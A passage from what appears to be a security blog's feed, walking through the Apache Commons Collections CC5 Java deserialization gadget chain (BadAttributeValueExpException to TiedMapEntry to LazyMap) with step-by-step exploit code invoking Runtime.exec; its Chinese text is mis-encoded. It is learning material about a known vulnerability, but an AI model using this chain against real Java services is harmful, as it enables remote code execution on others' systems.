punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        Utils.UnSerialize(barr);</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;CC7 çš„é“¾å­å’Œ CC5 ç±»ä¼¼ï¼ŒååŠæ¡é“¾å­ä¹Ÿæ˜¯ &lt;code&gt;LazyMap.get()&lt;/code&gt; çš„é“¾å­ï¼Œç„¶åä¹Ÿæ¢äº†ä¸ªå…¥å£ç±»&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/&quot;&gt;https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-7-CC7&quot;&gt;https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-7-CC7&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CC5é“¾</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/06/CC5%E9%93%BE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/06/CC5%E9%93%BE/</id>
    <published>2024-09-06T02:38:43.000Z</published>
    <updated>2024-09-06T08:12:53.205Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>CC5ï¼Œè¯´ç™½äº†å°±æ˜¯åœ¨CC6çš„åŸºç¡€ä¸Šæ¢äº†ä¸ªå…¥å£ç±»</p><p>å‚è€ƒï¼š</p><p><a href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/">https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/</a></p><span id="more"></span><hr><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>ç»§ç»­æå‡ºä¹‹å‰çš„æ€»ç»“å›¾</p><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906104756602.png" alt="image-20240906104756602"></p><p>CC5çš„å…¥å£ç±»æ˜¯ <code>BadAttributeValueExpException</code> çš„ <code>readObject()</code> æ–¹æ³•ï¼Œè¿™ä¸ªä¸éš¾ç†è§£</p><p>å…³é”®æ˜¯è¿™é‡Œçš„<code>LazyMap.get()</code> æ–¹æ³•è¢«<code>TiedMapEntry.toString()</code>è°ƒç”¨äº†ï¼Œè¦æ‰¾è°è°ƒç”¨äº†<code>toString()</code>å¯å¤ªå¤šäº†ï¼Œåªèƒ½æ­£å‘åˆ†æ</p><p>ç›´æ¥çœ‹ javax.management.BadAttributeValueExpException#readObject</p><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906105302385.png" alt="image-20240906105302385"></p><p>è¿™é‡Œè°ƒç”¨äº† <code>toString()</code> æ–¹æ³•ï¼Œç„¶å <code>TiedMapEntry</code> è¿™ä¸ªç±»è°ƒç”¨äº† <code>toString()</code> æ–¹æ³•</p><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906105359987.png" alt="image-20240906105359987"></p><p>å—¯ï¼Œç†Ÿæ‚‰çš„ getValueï¼Œè·Ÿè¿›ä¸€ä¸‹åé¢å°±è¿ä¸Š <code>LazyMap.get</code> äº†</p><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906105540881.png" alt="image-20240906105540881"></p><p>é‚£ä¹ˆå°±æ˜¯è®© valObj ä¸º TiedMapEntry å°±è¡Œäº†</p><hr><h1 id="å†™exp"><a href="#å†™exp" class="headerlink" title="å†™exp"></a>å†™exp</h1><h2 id="LazyMap-get-éƒ¨åˆ†"><a href="#LazyMap-get-éƒ¨åˆ†" class="headerlink" title="LazyMap.get()éƒ¨åˆ†"></a>LazyMap.get()éƒ¨åˆ†</h2><p>ååŠæ®µç›´æ¥å¥— cc1çš„ LazyMapChain å³å¯</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc5</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">LazyMap</span><span class="token punctuation">></span></span> lazyMapClass <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> lazyGetMethod <span class="token operator">=</span> lazyMapClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyGetMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyGetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PSï¼šæœ€åçš„åå°„éƒ¨åˆ†æ˜¯ç”¨æ¥è¯æ˜è¿™ä¸ªexpæ˜¯å¯è¡Œçš„</p><h2 id="TiedMapEntry-toString-éƒ¨åˆ†"><a href="#TiedMapEntry-toString-éƒ¨åˆ†" class="headerlink" title="TiedMapEntry.toString()éƒ¨åˆ†"></a>TiedMapEntry.toString()éƒ¨åˆ†</h2><p><code>TiedMapEntry</code> è¿™ä¸ªç±»ç»§æ‰¿äº†ååºåˆ—åŒ–ï¼Œå¹¶ä¸”æ˜¯ public çš„ç±»ï¼Œå¯æ“çºµæ€§éå¸¸å¼º</p><p>ç›´æ¥çœ‹æ„é€ æ–¹æ³•å’Œç›¸å…³çš„æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>map <span class="token operator">=</span> map<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">=</span> key<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆåªéœ€è¦å°†mapèµ‹å€¼ä¸º decorateMap å³å¯</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tiedMapEntry<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ­¤æ—¶çš„expï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc5</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tiedMapEntry<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="BadAttributeValueExpExceptionå…¥å£ç±»éƒ¨åˆ†"><a href="#BadAttributeValueExpExceptionå…¥å£ç±»éƒ¨åˆ†" class="headerlink" title="BadAttributeValueExpExceptionå…¥å£ç±»éƒ¨åˆ†"></a>BadAttributeValueExpExceptionå…¥å£ç±»éƒ¨åˆ†</h2><p>å…¥å£ç±»çš„ <code>BadAttributeValueExpException</code> çš„ä½œç”¨åŸŸæ˜¯ publicï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ new ä¸€ä¸ªå¯¹è±¡</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä¿®æ”¹ <code>BadAttributeValueExpException</code> çš„ val å€¼ï¼Œè€Œ <code>BadAttributeValueExpException</code> æ˜¯æ”¯æŒåºåˆ—åŒ–çš„ï¼Œç›´æ¥ç”¨åå°„çš„æ–¹å¼æ¥ä¿®æ”¹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> <span class="token string">"val"</span><span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="æœ€ç»ˆçš„exp"><a href="#æœ€ç»ˆçš„exp" class="headerlink" title="æœ€ç»ˆçš„exp"></a>æœ€ç»ˆçš„exp</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc5</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span 